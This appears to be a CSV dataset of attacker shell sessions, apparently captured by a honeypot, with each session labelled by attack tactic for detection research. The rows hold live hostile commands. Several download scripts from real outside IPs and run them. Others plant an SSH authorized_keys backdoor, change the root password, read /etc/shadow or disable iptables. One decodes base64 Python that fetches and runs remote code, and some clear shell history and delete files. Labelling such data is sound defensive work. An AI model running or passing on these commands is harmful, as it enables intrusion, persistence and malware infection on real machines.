,session,labels
unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; unset HISTFILE unset HISTSIZE ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ;,unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; unset HISTFILE unset HISTSIZE ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ; uname -a || cat /proc/version ;,Defense Evasion - 1 -- Discovery - 36
sudo hive-passwd 34g1g5332h3ikj15lon2g23r32livg322e222 ; sudo pkill Xorg ; sudo pkill x11vnc ; cat /hive-config/rig.conf ;,sudo hive-passwd 34g1g5332h3ikj15lon2g23r32livg322e222 ; sudo pkill Xorg ; sudo pkill x11vnc ; cat /hive-config/rig.conf ;,Persistence - 0 -- Impact - 2 -- Discovery - 3
top ;,top ;,Discovery - 0
"cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l | head -c 30 ; echo root:D6gcknhnxMmt | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} | head -c 30 ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} | head -c 30 ; which ls ; ls -lh $which ls | head -c 100 ; crontab -l | head -n 5 ; w | head -c 1000 ; uname -m | head -c 30 ; cat /proc/cpuinfo | grep model | grep name | wc -l | head -c 30 ; top | head -n 30 ; uname | head -c 30 ; uname -a | head -c 200 ; lscpu | grep Model | head -c 200 ;","cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l | head -c 30 ; echo root:D6gcknhnxMmt | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} | head -c 30 ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} | head -c 30 ; which ls ; ls -lh $which ls | head -c 100 ; crontab -l | head -n 5 ; w | head -c 1000 ; uname -m | head -c 30 ; cat /proc/cpuinfo | grep model | grep name | wc -l | head -c 30 ; top | head -n 30 ; uname | head -c 30 ; uname -a | head -c 200 ; lscpu | grep Model | head -c 200 ;",Persistence - 4 -- Discovery - 9 -- Persistence - 12 -- Discovery - 44
stty raw -echo ; LANG=C ; printf command_start_%s 13VPsUhv ; uname -a ; printf command_done_%s P_dVQuDz ;,stty raw -echo ; LANG=C ; printf command_start_%s 13VPsUhv ; uname -a ; printf command_done_%s P_dVQuDz ;,Discovery - 4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / ; wget http://178.128.96.167/update.sh ; curl -O http://178.128.96.167/update.sh ; chmod 777 update.sh ; sh update.sh ; tftp 178.128.96.167 -c get update.sh ; chmod 777 update.sh ; sh update.sh ; tftp -r update2.sh -g 178.128.96.167 ; chmod 777 update2.sh ; sh update2.sh ; ftpget -v -u anonymous -p anonymous -P 21 178.128.96.167 update1.sh update1.sh ; sh update1.sh ; rm -rf update.sh update.sh update2.sh update1.sh ; rm -rf * ;,cd /tmp || cd /var/run || cd /mnt || cd /root || cd / ; wget http://178.128.96.167/update.sh ; curl -O http://178.128.96.167/update.sh ; chmod 777 update.sh ; sh update.sh ; tftp 178.128.96.167 -c get update.sh ; chmod 777 update.sh ; sh update.sh ; tftp -r update2.sh -g 178.128.96.167 ; chmod 777 update2.sh ; sh update2.sh ; ftpget -v -u anonymous -p anonymous -P 21 178.128.96.167 update1.sh update1.sh ; sh update1.sh ; rm -rf update.sh update.sh update2.sh update1.sh ; rm -rf * ;,Execution - 16 -- Defense Evasion - 18
scp -tr /usr/bin/ ; C0755 3434280 hyhvjs ;,scp -tr /usr/bin/ ; C0755 3434280 hyhvjs ;,Execution - 1
uname -a ; uname -a ; uname -a ; python -c import base64;execbase64.b64decode'aW1wb3J0IGJhc2U2NCx1cmxsaWIKZm9yIGkgaW4gcmFuZ2UoNSk6CiAgICB0cnk6CiAgICAgICAgZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHVybGxpYi51cmxvcGVuKCdodHRwOi8vay56c3c4LmNjL0FwaS8nKS5yZWFkKCkpKQogICAgICAgIGJyZWFrCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcw==' ;,uname -a ; uname -a ; uname -a ; python -c import base64;execbase64.b64decode'aW1wb3J0IGJhc2U2NCx1cmxsaWIKZm9yIGkgaW4gcmFuZ2UoNSk6CiAgICB0cnk6CiAgICAgICAgZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHVybGxpYi51cmxvcGVuKCdodHRwOi8vay56c3c4LmNjL0FwaS8nKS5yZWFkKCkpKQogICAgICAgIGJyZWFrCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcw==' ;,Execution - 3
ps ; cat /etc/passwd ; cat /etc/shadow ; su root & whoami ; sudo su root & whoami ; uname -a ; df ; fdisk -l ; cat /proc/mounts ;,ps ; cat /etc/passwd ; cat /etc/shadow ; su root & whoami ; sudo su root & whoami ; uname -a ; df ; fdisk -l ; cat /proc/mounts ;,Discovery - 8
ping ; cd /tmp ; tftp -r rr -l rr -g 51.15.135.96 ; sh rr ;,ping ; cd /tmp ; tftp -r rr -l rr -g 51.15.135.96 ; sh rr ;,Discovery - 0 -- Execution - 3
cd /tmp cd /var/run cd /mnt cd /root cd / ; wget http://136.144.41.55/Saitama.sh ; curl -O http://136.144.41.55/Saitama.sh ; chmod 777 Saitama.sh ; sh Saitama.sh ; tftp 136.144.41.55 -c get tSaitama.sh ; chmod 777 tSaitama.sh ; sh tSaitama.sh ; tftp -r tSaitama2.sh -g 136.144.41.55 ; chmod 777 tSaitama2.sh ; sh tSaitama2.sh ; ftpget -v -u anonymous -p anonymous -P 21 136.144.41.55 Saitama1.sh Saitama1.sh ; sh Saitama1.sh ; rm -rf Saitama.sh tSaitama.sh tSaitama2.sh Saitama1.sh ; rm -rf * ;,cd /tmp cd /var/run cd /mnt cd /root cd / ; wget http://136.144.41.55/Saitama.sh ; curl -O http://136.144.41.55/Saitama.sh ; chmod 777 Saitama.sh ; sh Saitama.sh ; tftp 136.144.41.55 -c get tSaitama.sh ; chmod 777 tSaitama.sh ; sh tSaitama.sh ; tftp -r tSaitama2.sh -g 136.144.41.55 ; chmod 777 tSaitama2.sh ; sh tSaitama2.sh ; ftpget -v -u anonymous -p anonymous -P 21 136.144.41.55 Saitama1.sh Saitama1.sh ; sh Saitama1.sh ; rm -rf Saitama.sh tSaitama.sh tSaitama2.sh Saitama1.sh ; rm -rf * ;,Execution - 12 -- Defense Evasion - 14
EHLO 3133302e3139322e3136362e313237.net ;,EHLO 3133302e3139322e3136362e313237.net ;,Harmless - 0
"cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l ; echo root:xRMMetb5M3WA | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;","cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l ; echo root:xRMMetb5M3WA | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;",Persistence - 4 -- Discovery - 8 -- Persistence - 11 -- Discovery - 53
service iptables stop ; cd /tmp ; curl -O http://193.169.252.247:1888/index_bak ;,service iptables stop ; cd /tmp ; curl -O http://193.169.252.247:1888/index_bak ;,Impact - 0 -- Harmless - 2
